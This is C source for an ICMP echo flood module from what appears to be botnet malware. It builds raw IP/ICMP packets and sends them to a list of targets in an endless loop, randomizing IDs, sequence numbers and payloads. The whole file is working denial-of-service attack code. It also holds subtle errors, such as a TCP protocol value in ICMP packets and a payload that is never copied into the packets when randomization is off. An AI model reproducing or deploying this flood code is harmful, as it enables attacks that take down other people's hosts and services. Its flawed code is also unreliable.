#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/icmp.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

void flood_icmpecho(pflood_context_t ctx) {
  size_t payload_len = 0;
  size_t buffer_len = 0;
  uint8_t *buffer = NULL;

  // len options
  u16 len = flood_retrieve_u16(ctx, OPT_LEN, 32);
  u16 minlen = flood_retrieve_u16(ctx, OPT_MINLEN, 0);
  u16 maxlen = flood_retrieve_u16(ctx, OPT_MAXLEN, 0);

  // payload options
  u8 random = flood_retrieve_u32(ctx, OPT_RANDOMIZE, true);
  pu8 payload = flood_retrieve_bytes(ctx, OPT_PAYLOAD, &payload_len);

  // generate initial buffer
  if (!random) {
    buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
  }

  // alloc enough char pointers
  char **packets = calloc(ctx->num_targs, sizeof(char *));
  if (!packets) exit(0);

  int fd = -1;
  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
    LOG_ERROR("opening a raw socket failed");
    exit(0);
  }

  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int[]){1}, sizeof(int)) == -1) {
    LOG_INFO("setting HDRINCL failed");
    close(fd);
    exit(0);
  }

  for (int i = 0; i < ctx->num_targs; i++) {
    ptarget_t target = &ctx->targets[i];

    packets[i] = calloc(1510, sizeof(char));
    memset(packets[i], '\0', 1510);

    struct iphdr *ip = (struct iphdr *)packets[i];
    ip->version = IPVERSION;
    ip->ttl = IPDEFTTL;
    ip->protocol = IPPROTO_TCP;

    ip->id = xoshiro_next() & 0xFFFF;
    ip->ihl = 5;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + buffer_len);

    ip->daddr = target->address;
    ip->saddr = network_local_addr();

    struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->checksum = 0;
    icmp->un.echo.id = xoshiro_next() & 0xffff;
    icmp->un.echo.sequence = xoshiro_next() & 0xffff;
  }

  while (true) {
    for (int i = 0; i < ctx->num_targs; i++) {
      ptarget_t target = &ctx->targets[i];
      target_random_addr(target);

      struct iphdr *iph = (struct iphdr *)packets[i];
      struct icmphdr *icmph = (struct icmphdr *)(iph + 1);
      char *data = (char *)(icmph + 1);

      // generate buffer if random is enabled
      if (random) {
        buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
        memcpy(data, buffer, buffer_len);
      }

      iph->daddr = target->address;
      iph->id = xoshiro_next() & 0xFFFF;
      iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + buffer_len);

      // randomize window and sequence and stuff
      icmph->un.echo.id = xoshiro_next() & 0xffff;
      icmph->un.echo.sequence = xoshiro_next() & 0xffff;

      // calc checksum
      iph->check = 0;
      iph->check = csum_compute(iph, sizeof(struct iphdr));

      icmph->checksum = 0;
      icmph->checksum = csum_compute(icmph, sizeof(struct icmphdr) + buffer_len);

      sendto(fd, packets[i], ntohs(iph->tot_len), 0, (struct sockaddr *)&target->saddr,
             sizeof(struct sockaddr_in));

      if (random) free(buffer);
    }
  }
}
